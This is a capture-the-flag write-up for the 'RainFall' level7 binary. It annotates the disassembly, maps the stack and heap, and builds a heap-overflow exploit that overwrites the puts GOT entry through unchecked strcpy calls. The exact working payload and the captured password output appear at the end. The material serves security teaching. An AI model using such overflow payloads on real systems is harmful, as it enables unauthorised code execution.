
#### notes
```
0x8049928  : <puts@plt> jump address
0x080484f4 : m function address
```

#### 0x0804847c: main() : disassembly
```
esp+0x18 = esp+24
esp+0x1c = esp+28
esp+0xc = esp+12

```
_`<0> → <+6> : prepare stack frame for n function with size 32`_
```c
0x08048521 <+0>:	push   ebp
0x08048522 <+1>:	mov    ebp,esp
0x08048524 <+3>:	and    esp,0xfffffff0
0x08048527 <+6>:	sub    esp,0x20
```
_`<+9> → <+29> : allocate size of 8 with malloc into esp+28 variable lets name it mOne, set the first case to 0  (DWORD PTR [eax] <=> mOne[0]) `_
```c
0x0804852a <+9>:	mov    DWORD PTR [esp],0x8 // *esp = 8
0x08048531 <+16>:	call   0x80483f0 <malloc@plt> // malloc(8)
0x08048536 <+21>:	mov    DWORD PTR [esp+28],eax // *esp+28 = malloc(8)
0x0804853a <+25>:	mov    eax,DWORD PTR [esp+28] // eax = *malloc(8)
0x0804853e <+29>:	mov    DWORD PTR [eax],0x1 // *eax = *eax + 1
// mOne = malloc(8)
// mOne[0] = 1
// esp+28 = mOne
```
_`<+35> → <+53> :  allocate size of 8 with malloc into the the second case of mOne variable (DWORD PTR [eax+4] <=> mOne[1])`_
```c
0x08048544 <+35>:	mov    DWORD PTR [esp],8
0x0804854b <+42>:	call   0x80483f0 <malloc@plt> 
0x08048550 <+47>:	mov    edx,eax // edx = malloc(8)
0x08048552 <+49>:	mov    eax,DWORD PTR [esp+28] edx = mOne
0x08048556 <+53>:	mov    DWORD PTR [eax+4],edx // mOne[1] = edx
// mOne[1] =  malloc(8)
```
_`<+56> → <+68> : allocate size of 8 with malloc into esp+24 variable lets name it mTwo`_
```c
0x08048559 <+56>:	mov    DWORD PTR [esp],8
0x08048560 <+63>:	call   0x80483f0 <malloc@plt> // malloc(8)
0x08048565 <+68>:	mov    DWORD PTR [esp+24],eax // esp+24 = &eax
// mTwo = malloc(8)
// esp+24 = mTwo
```
_`<+72> → <+100> : set the index 0 at mTwo to 2 and set the address return of malloc(8) to inde 1 of mTwo`_
```c
0x08048569 <+72>:	mov    eax,DWORD PTR [esp+24] // eax = *esp+24 
0x0804856d <+76>:	mov    DWORD PTR [eax],0x2 // *eax = 2
0x08048573 <+82>:	mov    DWORD PTR [esp],8
0x0804857a <+89>:	call   0x80483f0 <malloc@plt>
0x0804857f <+94>:	mov    edx,eax // edx = malloc(8)
0x08048581 <+96>:	mov    eax,DWORD PTR [esp+24] // eax = mTwo0
0x08048585 <+100>:	mov    DWORD PTR [eax+4],edx // mTwo[1] = mFour
// mTwo[0] = 2
// mTwo[1] = malloc(8)
```
_`<+103> → <+111> : setup the first argument for strcpy by taking its pointer , steps : `_
_`* eax= argv[1] set address of argv[1] to eax`_
_`* eax= *argv[1] set the value of argv[1] to eax`_
_`* edx = eax set argv[1] to edx`_
_`<+113> → <+127> : setup params for stcpy in the stack (esp, esp+4)`_
```c
0x08048588 <+103>:	mov    eax,DWORD PTR [ebp+12] // eax = argv
0x0804858b <+106>:	add    eax,4  
0x0804858e <+109>:	mov    eax,DWORD PTR [eax] // eax = argv + 4 = argv[1]
0x08048590 <+111>:	mov    edx,eax // edx = *argv[1]
0x08048592 <+113>:	mov    eax,DWORD PTR [esp+28]
0x08048596 <+117>:	mov    eax,DWORD PTR [eax+4]
0x08048599 <+120>:	mov    DWORD PTR [esp+0x4],edx
0x0804859d <+124>:	mov    DWORD PTR [esp],eax
0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>
// strcpy(mOne[1], argv[1])
```
_`<+> → <+> : same as before but this time to copy argv[2] into mTwo[1]`_
```c
0x080485a5 <+132>:	mov    eax,DWORD PTR [ebp+12]
0x080485a8 <+135>:	add    eax,8
0x080485ab <+138>:	mov    eax,DWORD PTR [eax]
0x080485ad <+140>:	mov    edx,eax
0x080485af <+142>:	mov    eax,DWORD PTR [esp+24]
0x080485b3 <+146>:	mov    eax,DWORD PTR [eax+4]
0x080485b6 <+149>:	mov    DWORD PTR [esp+0x4],edx
0x080485ba <+153>:	mov    DWORD PTR [esp],eax
0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>
// strcpy(mTwo[1], argv[2])
```
_`<+161> → <+178> : call fopen to reac the .pass file with read mode, which contains the flag to level8`_
```c
0x080485c2 <+161>:	mov    edx,0x80486e9 // "r"
0x080485c7 <+166>:	mov    eax,0x80486eb // "/home/user/level8/.pass"
0x080485cc <+171>:	mov    DWORD PTR [esp+0x4],edx
0x080485d0 <+175>:	mov    DWORD PTR [esp],eax
0x080485d3 <+178>:	call   0x8048430 <fopen@plt> // password = fopen("/home/user/level8/.pass", "r")
```
_`<+183> → <+202> : setup the arguments for fgets in the stack `_
_`- esp     : variable c`_
_`- esp + 4 : 68`_
_`- esp + 8 : password`_
_`- fgets(esp, esp+4, esp+8)`_
_`- fgets(c, 68, password)`_
```c
0x080485d8 <+183>:	mov    DWORD PTR [esp+0x8],eax // password
0x080485dc <+187>:	mov    DWORD PTR [esp+0x4],0x44 // 68
0x080485e4 <+195>:	mov    DWORD PTR [esp],0x8049960 // variable c
0x080485eb <+202>:	call   0x80483c0 <fgets@plt> // fgets(c, 68, password)
```
_`<+207> → <+219> : print ~~ in the console`_
```c
0x080485f0 <+207>:	mov    DWORD PTR [esp],0x8048703 // "~~"
0x080485f7 <+214>:	call   0x8048400 <puts@plt> // puts("~~")
0x080485fc <+219>:	mov    eax,0x0
```
_`<+224> → <+225> : exit the programm`_
```c
0x08048601 <+224>:	leave
0x08048602 <+225>:	ret
```
#### stack illustration
```
    high addresses
+------------------------+   <= ebp + 14
: av[2]<- *(ebp+12) + 8  :
: av[1]<- *(ebp+12) + 4  :
: av[0]<- *(ebp+12) + 0  :
+------------------------+   <= ebp + 12
:        argc            :
+------------------------+   <= ebp + 8
:        eip             :
+------------------------+   <= ebp+4
:        ebp             :
+------------------------+   <= esp + 32  <------+
:    stack alignement    :                       |
+------------------------+                       | 
:  malloc(8) (mOne 1st)  :                       |
:     mOne[0] : 1        :                       |
:     mOne[1] : malloc(8):                       |
+------------------------+   <= esp + 28         |
:  malloc(8) (mTwo 3dt)  :                       |
:     mTwo[0] : 2        :                       |
:     mTwo[1] : malloc(8):                       |
+------------------------+   <= esp + 24         |  32 bytes
           .                                     |
          ...                                    |
         .....                                   |
          ...                                    |
           .                                     |
+------------------------+   <= esp + 4          |
:                        :                       |
+------------------------+   <= esp      <-------+
    low addresses
``` 
---
#### Solution :
---
by reading the assembly we get the following resume
- the program takes two params , av1 && av2
- decalred two variables (m1, m2) with size of 8 and allocating anther size of 8 to the index 1 of each
- copy av1 to m1[1] using strcpy
- copy av2 to m2[1] using strcpy
- strcpy copy whatever in source to destination without checking for size so it vulenrable to buffer overflow

lets execute the programm using ltrace to watch what happening :
```
level7@RainFall:~$ ltrace ./level7 AAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBB
__libc_start_main(0x8048521, 3, 0xbffff794, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                                 = 0x0804a008
malloc(8)                                                                 = 0x0804a018
malloc(8)                                                                 = 0x0804a028
malloc(8)                                                                 = 0x0804a038
strcpy(0x0804a018, "AAAAAAAAAAAAAAAAAAAA")                                = 0x0804a018
strcpy(0x0804a038, "BBBBBBBBBBBBBBBBBBBB")                                = 0x0804a038
fopen("/home/user/level8/.pass", "r"*** glibc detected *** ./level7: free(): invalid next size (normal): 0x0804a048 ***
```
we can that the second strcpy is 32 bytes ahead of the first one
lets try to fill the first arguments with larger value to see at which length we override the second address in the hype of the strcpy 2
```
level7@RainFall:~$ ltrace ./level7 $(python -c 'print "A" * 21')  ABCD
__libc_start_main(0x8048521, 3, 0xbffff7a4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                                 = 0x0804a008
malloc(8)                                                                 = 0x0804a018
malloc(8)                                                                 = 0x0804a028
malloc(8)                                                                 = 0x0804a038
strcpy(0x0804a018, "AAAAAAAAAAAAAAAAAAAAA")                               = 0x0804a018
strcpy(0x08040041, "ABCD" <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
level7@RainFall:~$
```
at the length 21 we see that the address of av2[1] got changed in the last 2 bits

__the exploit :__
1- overide the address 0x8049928 (puts jump address) with the m function address that print the variable c
final exploit will look like that
```
strcpy(0x0804a018, "padding") 
strcpy("JUMP ADDRESS", "m() address")
```

so the exploit payload is 
```
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
level7@RainFall:~$ clear
level7@RainFall:~$ ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1663318810
level7@RainFall:~$
```
